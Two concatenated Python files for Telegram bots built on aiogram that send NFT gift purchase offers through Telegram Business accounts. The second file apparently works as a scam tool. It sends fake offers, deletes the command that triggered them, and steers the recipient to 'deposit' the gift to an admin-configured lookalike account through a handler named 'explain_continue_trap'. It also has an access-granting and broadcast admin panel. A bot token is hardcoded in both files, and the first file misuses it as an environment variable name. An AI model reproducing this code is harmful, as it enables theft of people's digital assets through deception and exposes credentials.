import asyncio
import html
import logging
import os
import re

from aiogram import Bot, Dispatcher, F
from aiogram.exceptions import TelegramAPIError
from aiogram.filters import Command
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    LinkPreviewOptions,
)

# Install: pip install -U aiogram
# Set BOT_TOKEN as an environment variable before starting the bot.
BOT_TOKEN = os.getenv("8642779036:AAEwpCQ-i26_YMX9mz_nuBZckL9TjWoqcug", "").strip()

if not BOT_TOKEN:
    raise RuntimeError(
        "BOT_TOKEN is missing. Set it as an environment variable; "
        "do not paste your bot token into a public file."
    )

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger("business_offer_bot")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


def parse_offer(text: str) -> tuple[str, str]:
    """
    Accepts:
      /offer MirageLamp-44307 2727 stars
      /offer https://t.me/nft/MirageLamp-44307 2.5 TON

    This parser only formats an informational offer. It does not verify
    ownership, price, escrow, or transfer of any NFT.
    """
    args = re.sub(r"^/offer(?:@\w+)?\s*", "", text or "", flags=re.I).strip()
    if not args:
        raise ValueError(
            "Использование: /offer MirageLamp-44307 2727 stars\n"
            "Или: /offer https://t.me/nft/MirageLamp-44307 2.5 TON"
        )

    # Split at the first price-like token, preserving URLs/slugs before it.
    match = re.search(r"\s(?=\d+(?:[.,]\d+)?(?:\s|$))", args)
    if match:
        slug_or_url = args[:match.start()].strip()
        price_text = args[match.start():].strip()
    else:
        parts = args.split(maxsplit=1)
        slug_or_url = parts[0]
        price_text = parts[1] if len(parts) > 1 else "Цена не указана"

    slug_or_url = slug_or_url.strip()
    if "t.me/nft/" in slug_or_url:
        slug = slug_or_url.split("t.me/nft/", 1)[1].split("?", 1)[0].strip("/")
    elif "fragment.com/gift/" in slug_or_url:
        slug = slug_or_url.split("fragment.com/gift/", 1)[1].split("?", 1)[0].strip("/")
    else:
        slug = slug_or_url.lstrip("@").replace("#", "-")

    if not slug or not re.fullmatch(r"[A-Za-z0-9_-]{1,100}", slug):
        raise ValueError("Не удалось распознать ссылку или название NFT.")

    price_text = price_text.strip()
    if not price_text:
        price_text = "Цена не указана"

    return slug, price_text


def offer_keyboard(slug: str) -> InlineKeyboardMarkup:
    # Callback data is kept short and contains no user-supplied arbitrary text.
    safe_slug = re.sub(r"[^A-Za-z0-9_-]", "", slug)[:40] or "nft"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Открыть NFT",
                    url=f"https://t.me/nft/{slug}",
                )
            ],
            [
                InlineKeyboardButton(
                    text="Принять предложение",
                    callback_data=f"offer_accept:{safe_slug}",
                ),
                InlineKeyboardButton(
                    text="Отклонить",
                    callback_data=f"offer_decline:{safe_slug}",
                ),
            ],
        ]
    )


def make_offer_text(slug: str, price: str) -> str:
    # Escape user-controlled text before inserting it into HTML.
    safe_slug = html.escape(slug)
    safe_price = html.escape(price)
    nft_url = f"https://t.me/nft/{slug}"
    return (
        "🎁 <b>Предложение по NFT</b>\n\n"
        f"NFT: <a href=\"{html.escape(nft_url, quote=True)}\">{safe_slug}</a>\n"
        f"Указанная цена: <b>{safe_price}</b>\n\n"
        "ℹ️ Это информационное предложение. Бот не подтверждает владение NFT, "
        "не удерживает средства и не проверяет передачу цифрового актива. "
        "Перед любыми действиями самостоятельно проверьте NFT, цену и условия сделки."
    )


@dp.business_message(F.text.startswith("/offer"))
async def handle_business_offer(message: Message) -> None:
    if not message.from_user:
        return

    # Business messages must carry the connection ID. Do not silently send
    # a normal bot message as a fallback, since that changes the sender.
    connection_id = message.business_connection_id
    if not connection_id:
        logger.warning("Received /offer without business_connection_id")
        return

    try:
        slug, price = parse_offer(message.text or "")
    except ValueError as exc:
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=connection_id,
            text=html.escape(str(exc)),
        )
        return

    text = make_offer_text(slug, price)

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=connection_id,
            text=text,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
            reply_markup=offer_keyboard(slug),
        )
    except TelegramAPIError:
        logger.exception(
            "Telegram rejected Business offer message (chat_id=%s, connection_id=%s)",
            message.chat.id,
            connection_id,
        )
        # Do not echo technical details or secrets to the chat.
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                business_connection_id=connection_id,
                text=(
                    "Не удалось отправить предложение через Telegram Business. "
                    "Проверьте журнал запуска бота: там записана причина ошибки."
                ),
            )
        except TelegramAPIError:
            logger.exception("Could not send the error notice through Business")


@dp.callback_query(F.data.startswith("offer_accept:"))
async def handle_accept(callback: CallbackQuery) -> None:
    await callback.answer(
        "Предложение отмечено как принятое. Это не подтверждает оплату или передачу NFT.",
        show_alert=True,
    )


@dp.callback_query(F.data.startswith("offer_decline:"))
async def handle_decline(callback: CallbackQuery) -> None:
    if callback.message:
        try:
            await callback.message.edit_reply_markup(reply_markup=None)
        except TelegramAPIError:
            logger.exception("Could not remove offer buttons")
    await callback.answer("Предложение отклонено.")


async def main() -> None:
    logger.info("Starting Telegram Business offer bot")
    try:
        await dp.start_polling(bot)
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
import asyncio
import json
import os
import re
import aiohttp
from bs4 import BeautifulSoup
from aiogram import Bot, Dispatcher, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions
)

# Токен вашего бота
BOT_TOKEN = os.getenv("BOT_TOKEN", "8642779036:AAEwpCQ-i26_YMX9mz_nuBZckL9TjWoqcug")
if not BOT_TOKEN or BOT_TOKEN == "PASTE_NEW_TOKEN_HERE":
    raise RuntimeError(
        "Укажи новый токен: замени PASTE_NEW_TOKEN_HERE в bot.py "
        "или добавь BOT_TOKEN в переменные окружения хостинга."
    )

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Ваш Telegram ID (главный администратор)
SUPER_ADMIN_IDS = [8975317102, 629408999, 6973187474, 6217489845]  

ALLOWED_FILE = "allowed_users.json"
ALL_USERS_FILE = "all_users.json"
CONFIG_FILE = "config.json"

class AdminStates(StatesGroup):
    waiting_for_grant_id = State()
    waiting_for_revoke_id = State()
    waiting_for_broadcast_text = State()
    waiting_for_nft_url = State()

def load_json_set(filename: str) -> set:
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                return set(json.load(f))
        except Exception:
            pass
    return set()

def save_json_set(filename: str, data: set):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(list(data), f)

def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"nft_url": "https://t.me/GiftReseII"}

def save_config(config: dict):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(config, f, ensure_ascii=False, indent=4)

allowed_users = load_json_set(ALLOWED_FILE)
all_users = load_json_set(ALL_USERS_FILE)

def register_user(user_id: int):
    if user_id not in all_users:
        all_users.add(user_id)
        save_json_set(ALL_USERS_FILE, all_users)

def is_authorized(user_id: int) -> bool:
    return user_id in SUPER_ADMIN_IDS or user_id in allowed_users

def normalize_slug(raw_input: str) -> str:
    text = raw_input.strip()
    if "t.me/nft/" in text:
        return text.split("t.me/nft/")[-1].split("?")[0].strip("/")
    if "fragment.com/gift/" in text:
        return text.split("fragment.com/gift/")[-1].split("?")[0].strip("/")
    text = text.replace("#", "-")
    return re.sub(r"\s+", "", text)

def format_fallback_name(slug: str) -> str:
    if "-" in slug:
        parts = slug.split("-")
        raw_name = parts[0]
        num = parts[1]
        spaced_name = re.sub(r"([a-z])([A-Z])", r"\1 \2", raw_name)
        return f"{spaced_name} #{num}"
    return slug

def parse_query_and_price(raw_text: str) -> tuple[str, str, str]:
    tokens = raw_text.strip().split()
    if not tokens:
        return "MirageLamp-44307", "2 727 ⭐️ Звёзд", "2 727 ⭐️"

    nft_parts, price_parts = [], []
    for token in tokens:
        if price_parts or re.match(r"^\d+", token):
            price_parts.append(token)
        else:
            nft_parts.append(token)

    raw_nft = "".join(nft_parts) if nft_parts else tokens[0]
    slug = normalize_slug(raw_nft)

    if not price_parts:
        return slug, "2 727 ⭐️ Звёзд", "2 727 ⭐️"

    price_str = " ".join(price_parts).lower()
    ton_match = re.search(r"(\d+(?:[.,]\d+)?)\s*(?:ton|тон|💎)", price_str)
    star_match = re.search(r"(\d+)\s*(?:star|stars|звезд|звёзд|зв|⭐️|⭐|\*)", price_str)

    if ton_match:
        ton_val = ton_match.group(1)
        return slug, f"{ton_val} 💎 TON", f"{ton_val} TON"

    if star_match:
        star_val = f"{int(star_match.group(1)):,}".replace(",", " ")
        return slug, f"{star_val} ⭐️ Звёзд", f"{star_val} ⭐️"

    only_num = re.search(r"(\d+(?:[.,]\d+)?)", price_str)
    val = only_num.group(1) if only_num else "2 727"
    return slug, f"{val} ⭐️ Звёзд", f"{val} ⭐️"

async def fetch_real_nft_data(slug: str) -> dict:
    url = f"https://t.me/nft/{slug}"
    fallback_data = {
        "slug": slug,
        "url": url,
        "name": format_fallback_name(slug),
        "thumb": "https://telegram.org/img/t_logo.png",
        "model": "Оригинал",
        "backdrop": "Стандарт"
    }

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        timeout = aiohttp.ClientTimeout(total=4)
        async with aiohttp.ClientSession(headers=headers, timeout=timeout) as session_http:
            async with session_http.get(url) as resp:
                if resp.status != 200:
                    return fallback_data
                html = await resp.text()

        soup = BeautifulSoup(html, "html.parser")
        title_meta = soup.find("meta", property="og:title")
        image_meta = soup.find("meta", property="og:image")
        if not title_meta or title_meta.get("content") == "Telegram":
            return fallback_data

        details = {}
        for row in soup.find_all("tr"):
            th, td = row.find("th"), row.find("td")
            if th and td:
                details[th.get_text(" ", strip=True).lower()] = td.get_text(" ", strip=True)

        return {
            "slug": slug,
            "url": url,
            "name": title_meta["content"].strip()[:100],
            "thumb": image_meta["content"] if image_meta else fallback_data["thumb"],
            "model": details.get("model", "Стандарт")[:50],
            "backdrop": details.get("backdrop", "Стандарт")[:50],
        }
    except Exception:
        return fallback_data

def format_parsed_card(data: dict, price_display: str) -> str:
    return (
        f"Пользователь предлагает Вам <b>{price_display}</b> за подарок <b><a href='{data['url']}'>{data['name']}</a></b>.\n\n"
        f"Предложение действует ещё 6 ч. 0 мин..\n"
        f"{data['url']}"
    )

def get_step1_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
            InlineKeyboardButton(text="Принять", callback_data="step2_accept")
        ]
    ])

def get_step2_kb() -> InlineKeyboardMarkup:
    config = load_config()
    target_url = config.get("nft_url", "https://t.me/ridss_jj")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать NFT", url=target_url)],
        [InlineKeyboardButton(text="➡️ Продолжить", callback_data="explain_continue_btn")]
    ])

@dp.message(F.text.in_({"/start", "/id"}))
async def cmd_start(message: Message):
    register_user(message.from_user.id)
    uid = message.from_user.id
    is_auth = is_authorized(uid)
    
    status_text = "✅ <b>У вас есть доступ к использованию бота.</b>" if is_auth else "❌ <b>У вас нет доступа к боту. Обратитесь к администратору.</b>"
    
    text = (
        "🎁 <b>Генератор интерактивных офферов NFT</b>\n\n"
        f"🔑 Ваш Telegram ID: <code>{uid}</code>\n"
        f"{status_text}\n\n"
        "⚙️ <b>Команды:</b>\n"
        "• <code>/offer [ссылка] [цена]</code> — отправить оффер\n"
    )
    if uid in SUPER_ADMIN_IDS:
        text += "• <code>/admins</code> — админ-панель"

    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == "/admins")
async def cmd_admins(message: Message, state: FSMContext):
    register_user(message.from_user.id)
    if message.from_user.id not in SUPER_ADMIN_IDS:
        await message.answer("❌ У вас нет прав администратора.")
        return
        
    total_users = len(all_users)
    auth_count = len(allowed_users)
    config = load_config()
    current_url = config.get("nft_url", "https://t.me/GiftReseII")
    
    text = (
        f"👑 <b>Админ-панель</b>\n\n"
        f"Всего пользователей: <b>{total_users}</b>\n"
        f"С доступом: <b>{auth_count}</b>\n"
        f"🔗 Текущая ссылка для передачи: <code>{current_url}</code>"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список доступов", callback_data="admin_list")],
        [InlineKeyboardButton(text="🔗 Изменить ссылку NFT", callback_data="admin_set_url")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast_start")],
        [
            InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin_grant_start"),
            InlineKeyboardButton(text="❌ Забрать доступ", callback_data="admin_revoke_start")
        ]
    ])
    await message.answer(text, parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "admin_list")
async def cb_admin_list(callback: CallbackQuery):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    users_list = "\n".join([f"• <code>{uid}</code>" for uid in allowed_users]) if allowed_users else "Список пуст"
    back_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ])
    await callback.message.edit_text(f"📋 <b>Доступы:</b>\n\n{users_list}", parse_mode="HTML", reply_markup=back_kb)
    await callback.answer()

@dp.callback_query(F.data == "admin_back")
async def cb_admin_back(callback: CallbackQuery):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    total_users = len(all_users)
    auth_count = len(allowed_users)
    config = load_config()
    current_url = config.get("nft_url", "https://t.me/GiftReseII")
    
    text = (
        f"👑 <b>Админ-панель</b>\n\n"
        f"Всего пользователей: <b>{total_users}</b>\n"
        f"С доступом: <b>{auth_count}</b>\n"
        f"🔗 Текущая ссылка для передачи: <code>{current_url}</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список доступов", callback_data="admin_list")],
        [InlineKeyboardButton(text="🔗 Изменить ссылку NFT", callback_data="admin_set_url")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast_start")],
        [
            InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin_grant_start"),
            InlineKeyboardButton(text="❌ Забрать доступ", callback_data="admin_revoke_start")
        ]
    ])
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    await callback.answer()

@dp.callback_query(F.data == "admin_set_url")
async def cb_set_url(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_nft_url)
    config = load_config()
    current_url = config.get("nft_url", "https://t.me/GiftReseII")
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
    await callback.message.edit_text(
        f"🔗 Текущая ссылка: <code>{current_url}</code>\n\n"
        "<b>Отправьте новую ссылку</b> (например: <code>https://t.me/NewAccount</code> или <code>t.me/account</code>):",
        parse_mode="HTML", reply_markup=back_kb
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_grant_start")
async def cb_grant_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_grant_id)
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
    await callback.message.edit_text(
        "➕ <b>Введите Telegram ID пользователя</b>, которому хотите выдать доступ:",
        parse_mode="HTML", reply_markup=back_kb
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_revoke_start")
async def cb_revoke_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_revoke_id)
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
    await callback.message.edit_text(
        "❌ <b>Введите Telegram ID пользователя</b>, у которого хотите забрать доступ:",
        parse_mode="HTML", reply_markup=back_kb
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_broadcast_start")
async def cb_broadcast_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_broadcast_text)
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
    await callback.message.edit_text(
        "📢 <b>Введите текст для рассылки всем пользователям бота:</b>",
        parse_mode="HTML", reply_markup=back_kb
    )
    await callback.answer()

@dp.message(AdminStates.waiting_for_nft_url)
async def process_nft_url(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    new_url = message.text.strip()
    config = load_config()
    config["nft_url"] = new_url
    save_config(config)
    await message.answer(f"✅ Ссылка для кнопки «Передать NFT» успешно изменена на:\n<code>{new_url}</code>", parse_mode="HTML")
    await state.clear()

@dp.message(AdminStates.waiting_for_grant_id)
async def process_grant_id(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    try:
        target_id = int(message.text.strip())
        allowed_users.add(target_id)
        save_json_set(ALLOWED_FILE, allowed_users)
        await message.answer(f"✅ Пользователь <code>{target_id}</code> успешно добавлен в список разрешенных!", parse_mode="HTML")
    except ValueError:
        await message.answer("❌ Неверный формат. Пожалуйста, введите числовой Telegram ID.")
    await state.clear()

@dp.message(AdminStates.waiting_for_revoke_id)
async def process_revoke_id(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    try:
        target_id = int(message.text.strip())
        if target_id in allowed_users:
            allowed_users.remove(target_id)
            save_json_set(ALLOWED_FILE, allowed_users)
            await message.answer(f"❌ Доступ у пользователя <code>{target_id}</code> успешно забран.", parse_mode="HTML")
        else:
            await message.answer(f"⚠️ Пользователь <code>{target_id}</code> не найден в списке доступов.", parse_mode="HTML")
    except ValueError:
        await message.answer("❌ Неверный формат. Пожалуйста, введите числовой Telegram ID.")
    await state.clear()

@dp.message(AdminStates.waiting_for_broadcast_text)
async def process_broadcast(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    broadcast_text = message.text
    await state.clear()
    
    status_msg = await message.answer("⏳ Запуск рассылки...")
    success = 0
    fail = 0
    
    for uid in all_users:
        try:
            await bot.send_message(uid, broadcast_text, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.1)
        except Exception:
            fail += 1
            
    await status_msg.edit_text(
        f"📢 <b>Рассылка завершена!</b>\n\n"
        f"✅ Успешно доставлено: <b>{success}</b>\n"
        f"❌ Ошибок: <b>{fail}</b>",
        parse_mode="HTML"
    )

# ==================== ЛОГИКА КОМАНДЫ /ar ====================

async def execute_ar_command(message: Message, is_business: bool = False):
    user_id = message.from_user.id
    register_user(user_id)

    if not is_authorized(user_id):
        await message.answer("❌ У вас нет доступа к использованию этого бота.")
        return

    # Безопасно убираем /offer из текста
    text = message.text or ""
    args_text = re.sub(r'^/offer(@\w+)?\s*', '', text, flags=re.IGNORECASE).strip()
    raw_args = args_text or "MirageLamp-44307 2727 stars"

    slug, price_display, _ = parse_query_and_price(raw_args)
    
    # Карточку отправляем только от имени подключённого Telegram Business-аккаунта.
    # Не переключаемся на обычную отправку от имени бота.
    biz_conn_id = message.business_connection_id if is_business else None
    if not biz_conn_id:
        await message.answer(
            "⚠️ Используй /offer в чате, подключённом через Telegram Business. "
            "Так карточка будет отправлена только от имени твоего аккаунта."
        )
        return

    try:
        data = await fetch_real_nft_data(slug)
    except Exception:
        await message.answer("⚠️ Не удалось получить данные по офферу, попробуйте позже.")
        return

    preview_opts = LinkPreviewOptions(
        is_disabled=False,
        prefer_large_media=True,
        show_above_text=True,
    )

    # 1. Отправляем карточку
    try:
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=biz_conn_id,
            text=format_parsed_card(data, price_display),
            parse_mode="HTML",
            link_preview_options=preview_opts,
            reply_markup=get_step1_kb(),
        )
    except Exception as e:
        await message.answer(f"⚠️ Ошибка отправки карточки: {e}")
        return

    # 2. Пауза, чтобы Telegram успел отрисовать карточку
    await asyncio.sleep(0.5)

    # 3. Удаление сообщения с командой /ar
    if biz_conn_id:
        try:
            await bot.delete_business_messages(
                business_connection_id=biz_conn_id,
                message_ids=[message.message_id],
            )
        except Exception as e:
            # Если Telegram запретил удалять, бот напишет вам ПРЯМО В ЧАТ
            error_text = (
                f"⚠️ <b>Telegram не дал удалить команду /ar!</b>\n\n"
                f"Причина: <code>{e}</code>\n\n"
                f"👉 <b>Что делать:</b>\n"
                f"1. Зайдите в настройки Telegram.\n"
                f"2. Перейдите в <b>Telegram Business -> Чат-боты</b>.\n"
                f"3. Выберите этого бота.\n"
                f"4. Включите галочку <b>«Удаление сообщений»</b> (Delete messages).\n"
                f"5. Перезапустите бота."
            )
            await bot.send_message(
                chat_id=message.chat.id,
                business_connection_id=biz_conn_id,
                text=error_text,
                parse_mode="HTML"
            )
            print(f"[ОШИБКА УДАЛЕНИЯ]: {e}")
    else:
        try:
            await message.delete()
        except Exception as e:
            await message.answer(f"⚠️ Ошибка удаления: <code>{e}</code>", parse_mode="HTML")

# Обработчик только для Telegram Business: карточка отправляется от имени владельца аккаунта.
@dp.business_message(F.text.startswith("/offer"))
async def handle_business_offer(message: Message):
    await execute_ar_command(message, is_business=True)

# ==================== КНОПКИ ОФФЕРА ====================

@dp.callback_query(F.data == "step2_accept")
async def process_step2(callback: CallbackQuery):
    step2_text = (
        "⏳ <b>Сделка ожидает депонирования подарка</b>\n\n"
        "1. Нажмите <b>«Передать NFT»</b> и отправьте подарок.\n"
        "2. После отправки нажмите <b>«Продолжить»</b>."
    )
    if callback.message:
        await callback.message.edit_text(text=step2_text, parse_mode="HTML", reply_markup=get_step2_kb())
    elif callback.inline_message_id:
        await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=step2_text, parse_mode="HTML", reply_markup=get_step2_kb())
    await callback.answer()

@dp.callback_query(F.data == "explain_continue_btn")
async def explain_continue_trap(callback: CallbackQuery):
    await callback.answer(
        text="Бот не проверяет передачу NFT автоматически. Проверьте статус сделки вручную в Telegram.",
        show_alert=True,
    )

@dp.callback_query(F.data == "decline_offer")
async def process_decline(callback: CallbackQuery):
    declined_text = "❌ <b>Предложение отклонено владельцем</b>"
    if callback.message:
        await callback.message.edit_text(text=declined_text, parse_mode="HTML")
    elif callback.inline_message_id:
        await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=declined_text, parse_mode="HTML")
    await callback.answer("Оффер отклонен")

# ==================== ЗАПУСК ====================

async def main():
    print("Бот успешно запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
